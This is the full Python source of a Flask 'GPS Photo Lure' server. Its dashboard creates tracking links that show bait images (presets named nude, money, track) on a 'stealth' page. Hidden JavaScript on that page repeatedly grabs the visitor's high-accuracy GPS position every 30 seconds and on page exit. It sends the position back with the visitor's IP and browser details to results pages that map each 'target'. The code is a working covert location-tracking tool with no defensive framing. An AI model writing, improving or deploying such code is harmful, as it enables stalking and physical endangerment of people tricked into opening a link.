#!/usr/bin/env python3
"""
GPS Photo Lure Server v3
- Dashboard with instant image buttons (nude/money/track)
- Click any image → instantly creates tracking link
- Also has full form for custom labels, uploads, external URLs
- Shows decoy image + GPS fires instantly + refreshes every 30s
"""

import os
import json
import uuid
import base64
import copy
import logging
import threading
import requests
from datetime import datetime, timezone
from pathlib import Path

from flask import (
    Flask, request, render_template_string, jsonify,
    redirect, url_for
)

# ── Config ──
DEFAULT_PORT = 5000
DEFAULT_HOST = "0.0.0.0"
MAX_CONTENT_LENGTH = 16 * 1024 * 1024
PRESETS = {"nude", "money", "track"}

links = {}
links_lock = threading.Lock()

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
log = logging.getLogger("gps-lure")

app = Flask(__name__)
app.config["MAX_CONTENT_LENGTH"] = MAX_CONTENT_LENGTH

# ── Image helpers ──

def load_preset_image(preset_name):
    path = Path("images") / f"{preset_name}.png"
    if path.exists():
        return path.read_bytes(), "image/png"
    path = Path("images") / f"{preset_name}.jpg"
    if path.exists():
        return path.read_bytes(), "image/jpeg"
    return None, None


def fetch_external_image(url):
    try:
        resp = requests.get(url, timeout=10, stream=True)
        if resp.status_code == 200:
            return resp.content, resp.headers.get("Content-Type", "image/jpeg")
    except Exception as e:
        log.warning("Failed to fetch external image %s: %s", url, e)
    return None, None


def image_to_data_uri(raw_bytes, mime):
    b64 = base64.b64encode(raw_bytes).decode("utf-8")
    return f"data:{mime};base64,{b64}"


def get_preset_data_uri(preset):
    raw, mime = load_preset_image(preset)
    if raw:
        return image_to_data_uri(raw, mime)
    return None


def get_preset_thumbnail_data_uri(preset):
    """Smaller thumbnail for the button preview (downscale by reading and re-encoding)"""
    raw, mime = load_preset_image(preset)
    if raw:
        # Just use the same image but smaller data URI won't matter much
        return image_to_data_uri(raw, mime)
    return None


# ── Stealth HTML template ──

STEALTH_TEMPLATE = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Photo</title>
<style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
        background: #000;
        display: flex;
        align-items: center;
        justify-content: center;
        min-height: 100vh;
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        padding: 10px;
    }
    .photo-container {
        max-width: 100%;
        max-height: 95vh;
        border-radius: 12px;
        overflow: hidden;
        box-shadow: 0 4px 30px rgba(255,255,255,0.15);
        background: #111;
    }
    .photo-container img {
        display: block;
        max-width: 100%;
        max-height: 90vh;
        width: auto;
        height: auto;
        object-fit: contain;
    }
    .status-bar {
        position: fixed;
        bottom: 0;
        left: 0;
        right: 0;
        background: rgba(0,0,0,0.7);
        color: #444;
        font-size: 10px;
        padding: 3px 12px;
        text-align: center;
        backdrop-filter: blur(4px);
        font-family: system-ui, sans-serif;
        z-index: 999;
    }
</style>
</head>
<body>
    {% if img_data %}
    <div class="photo-container">
        <img src="{{ img_data }}" alt="Photo">
    </div>
    {% else %}
    <div class="photo-container" style="display:flex;align-items:center;justify-content:center;padding:40px;color:#555;">
        <p>No image available.</p>
    </div>
    {% endif %}
    <div class="status-bar">Photo &bull; {{ visit_num }}</div>

<script>
(function() {
    var linkId = "{{ link_id }}";
    var visited = {{ visit_num }};
    var gpsInterval = null;

    function sendCapture(lat, lng, acc, err) {
        var payload = {
            link_id: linkId,
            visit: visited,
            latitude: lat,
            longitude: lng,
            accuracy: acc,
            error: err,
            user_agent: navigator.userAgent,
            timestamp_iso: new Date().toISOString()
        };
        try {
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "/capture", true);
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.send(JSON.stringify(payload));
        } catch(e) {}
        fetch("/capture", {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify(payload),
            keepalive: true
        }).catch(function(){});
    }

    function captureLocation() {
        if (!navigator.geolocation) {
            sendCapture(null, null, null, "geolocation not supported");
            return;
        }
        navigator.geolocation.getCurrentPosition(
            function(pos) {
                sendCapture(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, null);
            },
            function(err) {
                var msg = err.message || "unknown error";
                if (err.code === 1) msg = "permission denied";
                else if (err.code === 2) msg = "position unavailable";
                else if (err.code === 3) msg = "timeout";
                sendCapture(null, null, null, msg);
            },
            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
    }

    setTimeout(captureLocation, 200);
    gpsInterval = setInterval(captureLocation, 30000);

    document.addEventListener("visibilitychange", function() {
        if (!document.hidden) captureLocation();
    });

    window.addEventListener("beforeunload", function() {
        if (gpsInterval) clearInterval(gpsInterval);
        captureLocation();
    });
})();
</script>
</body>
</html>"""


# ── Routes ──

@app.route("/")
def index():
    """Dashboard with clickable image buttons + full form"""
    # Load preset image thumbnails for the buttons
    nude_thumb = get_preset_thumbnail_data_uri("nude") or ""
    money_thumb = get_preset_thumbnail_data_uri("money") or ""
    track_thumb = get_preset_thumbnail_data_uri("track") or ""

    return f"""<!DOCTYPE html>
<html>
<head>
<title>GPS Lure v3 — Dashboard</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
    * {{ box-sizing: border-box; }}
    body {{ font-family: system-ui, -apple-system, sans-serif; background: #0d0d10; color: #ddd; padding: 20px; max-width: 1000px; margin: 0 auto; }}
    h1 {{ color: #0a8; font-size: 22px; }}
    h2 {{ color: #aaa; font-size: 16px; margin-top: 25px; }}
    .card {{ background: #16161e; border: 1px solid #2a2a35; border-radius: 8px; padding: 20px; margin: 15px 0; }}
    label {{ display: block; margin: 10px 0 4px; font-size: 13px; color: #888; text-transform: uppercase; letter-spacing: 0.5px; }}
    input, select {{ width: 100%; padding: 8px 10px; background: #0d0d12; border: 1px solid #2a2a35; color: #eee; border-radius: 4px; font-size: 14px; }}
    input:focus, select:focus {{ border-color: #0a8; outline: none; }}
    .radio-group {{ display: flex; gap: 20px; flex-wrap: wrap; margin: 8px 0; }}
    .radio-group label {{ display: inline-flex; align-items: center; gap: 5px; text-transform: none; font-size: 14px; cursor: pointer; }}
    .radio-group input[type="radio"] {{ width: auto; }}
    .hidden {{ display: none; }}
    button {{ background: #0a8; color: #fff; border: none; padding: 10px 28px; border-radius: 6px; font-size: 15px; cursor: pointer; font-weight: 600; margin-top: 10px; }}
    button:hover {{ background: #0b9; }}
    button.secondary {{ background: transparent; border: 1px solid #2a2a35; color: #aaa; }}
    button.secondary:hover {{ border-color: #0a8; color: #0a8; }}
    code {{ background: #1a1a24; padding: 2px 6px; border-radius: 3px; font-size: 13px; color: #8cf; word-break: break-all; }}
    table {{ width: 100%; border-collapse: collapse; margin-top: 10px; }}
    th, td {{ padding: 8px 10px; text-align: left; border-bottom: 1px solid #222; font-size: 13px; }}
    th {{ color: #666; font-weight: 600; }}
    a {{ color: #4af; text-decoration: none; }}
    a:hover {{ text-decoration: underline; }}
    .help {{ font-size: 12px; color: #666; margin-top: 3px; }}

    /* ── Image buttons ── */
    .preset-grid {{
        display: grid;
        grid-template-columns: repeat(3, 1fr);
        gap: 12px;
        margin: 10px 0;
    }}
    .preset-btn {{
        background: #11111a;
        border: 2px solid #2a2a35;
        border-radius: 10px;
        padding: 10px;
        cursor: pointer;
        text-align: center;
        transition: all 0.15s;
        position: relative;
        overflow: hidden;
    }}
    .preset-btn:hover {{
        border-color: #0a8;
        background: #16162a;
        transform: translateY(-2px);
        box-shadow: 0 4px 20px rgba(0,170,136,0.15);
    }}
    .preset-btn:active {{
        transform: scale(0.97);
    }}
    .preset-btn img {{
        width: 100%;
        height: 120px;
        object-fit: cover;
        border-radius: 6px;
        background: #1a1a24;
        display: block;
    }}
    .preset-btn .label {{
        display: block;
        margin-top: 6px;
        font-size: 11px;
        font-weight: 600;
        color: #888;
        text-transform: uppercase;
        letter-spacing: 0.5px;
    }}
    .preset-btn .badge-quick {{
        position: absolute;
        top: 14px;
        right: 14px;
        background: #0a8;
        color: #fff;
        font-size: 8px;
        font-weight: 700;
        padding: 2px 8px;
        border-radius: 4px;
        text-transform: uppercase;
        letter-spacing: 0.5px;
        opacity: 0.9;
    }}
    .preset-btn.loading {{ opacity: 0.5; pointer-events: none; }}

    /* ── Quick result toast ── */
    .toast {{
        position: fixed;
        bottom: 20px;
        right: 20px;
        background: #16161e;
        border: 1px solid #0a8;
        border-radius: 8px;
        padding: 14px 18px;
        box-shadow: 0 4px 30px rgba(0,0,0,0.5);
        display: none;
        z-index: 999;
        max-width: 380px;
    }}
    .toast.show {{ display: block; animation: slideUp 0.25s ease; }}
    @keyframes slideUp {{ from {{ transform: translateY(20px); opacity: 0; }} to {{ transform: translateY(0); opacity: 1; }} }}
    .toast .title {{ font-size: 11px; color: #0a8; font-weight: 600; margin-bottom: 6px; }}
    .toast .link {{ font-size: 12px; word-break: break-all; }}
    .toast .link code {{ font-size: 11px; }}
    .toast .actions {{ margin-top: 8px; display: flex; gap: 6px; }}
    .toast .actions button {{ font-size: 11px; padding: 4px 12px; margin: 0; }}
    .toast .close {{ position: absolute; top: 8px; right: 10px; color: #555; cursor: pointer; font-size: 14px; }}

    @media (max-width: 600px) {{
        .preset-grid {{ grid-template-columns: 1fr; }}
        .preset-btn img {{ height: 160px; }}
    }}
</style>
</head>
<body>

    <h1>📷 GPS Photo Lure v3</h1>
    <p style="color:#888;">Click an image to instantly create a tracking link. Or use the form below for custom options.</p>

    <!-- ═══ INSTANT IMAGE BUTTONS ═══ -->
    <div class="card">
        <h2 style="margin:0 0 5px 0;color:#0a8;font-size:14px;">⚡ Instant Create</h2>
        <p style="font-size:12px;color:#666;margin-bottom:10px;">Click any image — link created instantly, no form needed</p>
        <div class="preset-grid">
            <div class="preset-btn" onclick="quickCreate('nude')" id="btn-nude">
                <span class="badge-quick">QUICK</span>
                {"<img src='" + nude_thumb + "' alt='nude' />" if nude_thumb else '<div style="height:120px;display:flex;align-items:center;justify-content:center;background:#1a1a24;border-radius:6px;color:#555;font-size:12px;">No image</div>'}
                <span class="label">nude.png</span>
            </div>
            <div class="preset-btn" onclick="quickCreate('money')" id="btn-money">
                <span class="badge-quick">QUICK</span>
                {"<img src='" + money_thumb + "' alt='money' />" if money_thumb else '<div style="height:120px;display:flex;align-items:center;justify-content:center;background:#1a1a24;border-radius:6px;color:#555;font-size:12px;">No image</div>'}
                <span class="label">money.png</span>
            </div>
            <div class="preset-btn" onclick="quickCreate('track')" id="btn-track">
                <span class="badge-quick">QUICK</span>
                {"<img src='" + track_thumb + "' alt='track' />" if track_thumb else '<div style="height:120px;display:flex;align-items:center;justify-content:center;background:#1a1a24;border-radius:6px;color:#555;font-size:12px;">No image</div>'}
                <span class="label">track.png</span>
            </div>
        </div>
    </div>

    <!-- ═══ FULL FORM ═══ -->
    <div class="card">
        <h2 style="margin:0 0 5px 0;color:#aaa;font-size:14px;">📝 Custom Create</h2>
        <form action="/create" method="post" enctype="multipart/form-data" id="createForm">

            <label>Image Source</label>
            <div class="radio-group">
                <label><input type="radio" name="img_source" value="preset" checked onchange="toggleSource()"> Preset</label>
                <label><input type="radio" name="img_source" value="upload" onchange="toggleSource()"> Upload</label>
                <label><input type="radio" name="img_source" value="url" onchange="toggleSource()"> External URL</label>
            </div>

            <div id="presetSection">
                <label>Choose Preset</label>
                <select name="preset">
                    <option value="nude">nude.png</option>
                    <option value="money">money.png</option>
                    <option value="track">track.png</option>
                </select>
            </div>

            <div id="uploadSection" class="hidden">
                <label>Upload Image (max 16MB)</label>
                <input type="file" name="photo" accept="image/*">
            </div>

            <div id="urlSection" class="hidden">
                <label>External Image URL</label>
                <input type="url" name="img_url" placeholder="https://example.com/photo.jpg">
                <div class="help">Server downloads and embeds this image</div>
            </div>

            <label>Label / Notes (optional)</label>
            <input type="text" name="label" placeholder="e.g. Target Alpha">

            <button type="submit">Generate Tracking Link</button>
        </form>
    </div>

    <!-- ═══ ACTIVE LINKS TABLE ═══ -->
    <h2>Active Links</h2>
    <div id="links">Loading...</div>

    <!-- ═══ TOAST ═══ -->
    <div class="toast" id="toast">
        <span class="close" onclick="closeToast()">✕</span>
        <div class="title">✅ Link Created</div>
        <div class="link"><code id="toastLink">-</code></div>
        <div class="actions">
            <button onclick="copyToastLink()">📋 Copy</button>
            <button class="secondary" onclick="window.open(document.getElementById('toastLink').textContent, '_blank')">🔗 Open</button>
            <button class="secondary" onclick="closeToast()">Close</button>
        </div>
    </div>

    <script>
        function toggleSource() {{
            var val = document.querySelector('input[name="img_source"]:checked').value;
            document.getElementById('presetSection').className = val === 'preset' ? '' : 'hidden';
            document.getElementById('uploadSection').className = val === 'upload' ? '' : 'hidden';
            document.getElementById('urlSection').className = val === 'url' ? '' : 'hidden';
        }}

        function showToast(link) {{
            document.getElementById('toastLink').textContent = link;
            document.getElementById('toast').classList.add('show');
        }}

        function closeToast() {{
            document.getElementById('toast').classList.remove('show');
        }}

        function copyToastLink() {{
            var text = document.getElementById('toastLink').textContent;
            navigator.clipboard.writeText(text).then(function() {{
                var btn = document.querySelector('.toast .actions button');
                btn.textContent = '✓ Copied';
                setTimeout(function() {{ btn.textContent = '📋 Copy'; }}, 2000);
            }});
        }}

        function quickCreate(preset) {{
            var btn = document.getElementById('btn-' + preset);
            btn.classList.add('loading');

            fetch('/quick-create', {{
                method: 'POST',
                headers: {{ 'Content-Type': 'application/json' }},
                body: JSON.stringify({{ preset: preset }})
            }})
            .then(function(r) {{ return r.json(); }})
            .then(function(data) {{
                btn.classList.remove('loading');
                if (data.link) {{
                    showToast(data.link);
                    loadLinks();
                }}
            }})
            .catch(function() {{
                btn.classList.remove('loading');
                alert('Failed to create link');
            }});
        }}

        function loadLinks() {{
            fetch('/links').then(function(r){{ return r.json(); }}).then(function(data){{
                var html = '<table><tr><th>Created</th><th>Label</th><th>Tracking URL</th><th>Visits</th><th>GPS Hits</th><th>Results</th></tr>';
                data.links.forEach(function(l){{
                    var url = window.location.origin + '/l/' + l.id;
                    html += '<tr>';
                    html += '<td style="font-size:11px;white-space:nowrap;">' + l.created + '</td>';
                    html += '<td>' + (l.label||'-') + '</td>';
                    html += '<td><code>' + url + '</code></td>';
                    html += '<td style="text-align:center;">' + l.visits + '</td>';
                    html += '<td style="text-align:center;">' + l.captures + '</td>';
                    html += '<td><a href="/results/' + l.id + '">View</a></td>';
                    html += '</tr>';
                }});
                html += '</table>';
                document.getElementById('links').innerHTML = html;
            }});
        }}

        toggleSource();
        loadLinks();
        setInterval(loadLinks, 5000);
    </script>
</body>
</html>"""


@app.route("/quick-create", methods=["POST"])
def quick_create():
    """Instant link creation from preset image buttons"""
    data = request.get_json(silent=True) or {}
    preset = data.get("preset", "nude").strip().lower()

    if preset not in PRESETS:
        return jsonify({"error": "invalid preset"}), 400

    raw_bytes, mime = load_preset_image(preset)
    if not raw_bytes:
        return jsonify({"error": f"Image {preset}.png not found in images/ folder"}), 404

    img_data = image_to_data_uri(raw_bytes, mime)
    link_id = uuid.uuid4().hex[:12]
    label = f"{preset}.png"

    with links_lock:
        links[link_id] = {
            "id": link_id,
            "created": datetime.now(timezone.utc).isoformat(),
            "label": label,
            "img_data": img_data,
            "img_source": "preset",
            "visits": [],
        }

    link_url = request.host_url.rstrip("/") + "/l/" + link_id
    log.info("Quick create %s -> %s", preset, link_id)

    return jsonify({
        "token": link_id,
        "link": link_url,
        "label": label
    })


@app.route("/create", methods=["POST"])
def create_link():
    """Full form: create link with preset/upload/URL"""
    label = request.form.get("label", "").strip()
    img_source = request.form.get("img_source", "preset")
    img_data = None

    if img_source == "preset":
        preset = request.form.get("preset", "nude").strip().lower()
        if preset not in PRESETS:
            preset = "nude"
        raw_bytes, mime = load_preset_image(preset)
        if raw_bytes:
            img_data = image_to_data_uri(raw_bytes, mime)

    elif img_source == "upload":
        photo = request.files.get("photo")
        if photo and photo.filename:
            raw_bytes = photo.read()
            if raw_bytes:
                ext = Path(photo.filename).suffix.lower()
                mime_map = {
                    ".png": "image/png", ".jpg": "image/jpeg", ".jpeg": "image/jpeg",
                    ".gif": "image/gif", ".webp": "image/webp",
                }
                mime = mime_map.get(ext, "image/jpeg")
                img_data = image_to_data_uri(raw_bytes, mime)

    elif img_source == "url":
        img_url = request.form.get("img_url", "").strip()
        if img_url:
            raw_bytes, mime = fetch_external_image(img_url)
            if raw_bytes:
                img_data = image_to_data_uri(raw_bytes, mime)

    link_id = uuid.uuid4().hex[:12]

    with links_lock:
        links[link_id] = {
            "id": link_id,
            "created": datetime.now(timezone.utc).isoformat(),
            "label": label if label else None,
            "img_data": img_data,
            "img_source": img_source,
            "visits": [],
        }

    log.info("Created link %s (label=%s, source=%s)", link_id, label, img_source)
    return redirect(url_for("index"))


@app.route("/l/<link_id>")
def serve_lure(link_id):
    """Decoy photo page + GPS capture"""
    with links_lock:
        link = links.get(link_id)
        if not link:
            return "<h1>Not found</h1>", 404

    visit_num = len(link["visits"]) + 1

    visit_record = {
        "visit": visit_num,
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "ip": request.remote_addr,
        "user_agent": request.headers.get("User-Agent", ""),
        "referer": request.headers.get("Referer", ""),
        "gps_updates": [],
    }

    with links_lock:
        link["visits"].append(visit_record)

    log.info("Link %s visit #%d from %s", link_id, visit_num, request.remote_addr)

    return render_template_string(
        STEALTH_TEMPLATE,
        link_id=link_id,
        visit_num=visit_num,
        img_data=link["img_data"],
    )


@app.route("/capture", methods=["POST"])
def capture_gps():
    """Receive GPS coordinates"""
    data = request.get_json(silent=True) or {}
    link_id = data.get("link_id")
    visit_num = data.get("visit")
    lat = data.get("latitude")
    lng = data.get("longitude")
    acc = data.get("accuracy")
    err = data.get("error")
    ua = data.get("user_agent", "")
    ts = data.get("timestamp_iso", datetime.now(timezone.utc).isoformat())

    if not link_id:
        return jsonify({"status": "missing link_id"}), 400

    with links_lock:
        link = links.get(link_id)
        if not link:
            return jsonify({"status": "link not found"}), 404

        for v in link["visits"]:
            if v["visit"] == visit_num:
                v["user_agent"] = ua
                v["gps_updates"].append({
                    "latitude": lat,
                    "longitude": lng,
                    "accuracy": acc,
                    "error": err,
                    "timestamp": ts,
                })
                break

    if lat is not None:
        log.info("📍 GPS for %s visit #%s: %.5f, %.5f (acc=%.1fm)",
                 link_id, visit_num, lat, lng, acc or 0)
    else:
        log.info("⛔ GPS failed for %s visit #%s: %s", link_id, visit_num, err)

    return jsonify({"status": "ok"})


@app.route("/results/<link_id>")
def show_results(link_id):
    """Detailed results page"""
    with links_lock:
        link = links.get(link_id)
        if not link:
            return "<h1>Not found</h1>", 404
        link_data = copy.deepcopy(link)

    total_visits = len(link_data["visits"])
    total_gps_hits = sum(
        1 for v in link_data["visits"]
        for u in v.get("gps_updates", [])
        if u.get("latitude") is not None
    )

    html = f"""<!DOCTYPE html>
<html>
<head>
<title>Results — {link_id}</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
    * {{ box-sizing: border-box; }}
    body {{ font-family: system-ui, -apple-system, sans-serif; background: #0d0d10; color: #ddd; padding: 20px; max-width: 1100px; margin: 0 auto; }}
    h1 {{ color: #0a8; }}
    h2 {{ color: #aaa; font-size: 18px; margin-top: 25px; }}
    .info {{ background: #16161e; border: 1px solid #2a2a35; border-radius: 8px; padding: 15px; margin: 10px 0; }}
    .info p {{ margin: 4px 0; font-size: 14px; }}
    table {{ width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 12px; }}
    th, td {{ padding: 6px 8px; text-align: left; border-bottom: 1px solid #222; }}
    th {{ color: #666; font-weight: 600; }}
    .success {{ color: #4c4; }}
    .fail {{ color: #c44; }}
    code {{ background: #1a1a24; padding: 2px 6px; border-radius: 3px; color: #8cf; }}
    pre {{ background: #111117; padding: 15px; border-radius: 6px; overflow-x: auto; font-size: 11px; }}
    a {{ color: #4af; }}
    .visit-card {{ background: #16161e; border: 1px solid #2a2a35; border-radius: 6px; padding: 10px; margin: 8px 0; }}
    .visit-card h4 {{ margin: 0 0 5px; color: #888; }}
    .gps-update {{ font-size: 11px; margin: 2px 0; }}
</style>
</head>
<body>
    <h1>📊 Link Results</h1>
    <div class="info">
        <p><strong>ID:</strong> <code>{link_id}</code></p>
        <p><strong>Label:</strong> {link_data["label"] or "(none)"}</p>
        <p><strong>Created:</strong> {link_data["created"]}</p>
        <p><strong>Image Source:</strong> {link_data["img_source"]}</p>
        <p><strong>Total Visits:</strong> {total_visits}</p>
        <p><strong>Total GPS Updates:</strong> {total_gps_hits}</p>
        <p><strong>Tracking URL:</strong> <code>{request.host_url.strip('/')}/l/{link_id}</code></p>
    </div>
"""

    for v in link_data["visits"]:
        gps_updates = v.get("gps_updates", [])
        latest_gps = None
        for u in reversed(gps_updates):
            if u.get("latitude") is not None:
                latest_gps = u
                break

        status = "📍 Located" if latest_gps else ("⛔ Failed" if any(u.get("error") for u in gps_updates) else "⏳ Pending")
        status_cls = "success" if latest_gps else "fail"

        html += f"""
    <div class="visit-card">
        <h4>Visit #{v["visit"]} — <span class="{status_cls}">{status}</span></h4>
        <p style="font-size:11px;color:#666;">{v["timestamp"]} | IP: {v["ip"]} | {v.get("user_agent","")[:50]}</p>
"""

        if gps_updates:
            html += f'<p style="font-size:11px;color:#888;margin:5px 0;">GPS Updates ({len(gps_updates)}):</p>'
            for idx, u in enumerate(gps_updates):
                if u.get("latitude") is not None:
                    map_url = f"https://www.google.com/maps?q={u['latitude']},{u['longitude']}"
                    html += f'<div class="gps-update">#{idx+1}: <span class="success">{u["latitude"]:.5f}, {u["longitude"]:.5f}</span>'
                    if u.get("accuracy"):
                        html += f' ±{u["accuracy"]:.1f}m'
                    html += f' <a href="{map_url}" target="_blank" style="color:#0a8;">[Map]</a> {u["timestamp"][:19]}</div>'
                elif u.get("error"):
                    html += f'<div class="gps-update">#{idx+1}: <span class="fail">❌ {u["error"]}</span> {u["timestamp"][:19]}</div>'

        html += '</div>'

    html += f"""
    <h2>Raw Data (JSON)</h2>
    <pre>{json.dumps(link_data, indent=2, default=str)}</pre>
</body>
</html>"""

    return html


@app.route("/links")
def list_links():
    """JSON: all active links"""
    with links_lock:
        result = []
        for lid, l in links.items():
            total_visits = len(l["visits"])
            captures = sum(
                1 for v in l["visits"]
                for u in v.get("gps_updates", [])
                if u.get("latitude") is not None
            )
            result.append({
                "id": lid,
                "created": l["created"],
                "label": l["label"],
                "img_source": l["img_source"],
                "visits": total_visits,
                "captures": captures,
            })
    return jsonify({"links": result, "total": len(result)})


@app.route("/health")
def health():
    return jsonify({"status": "ok", "links": len(links)})


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
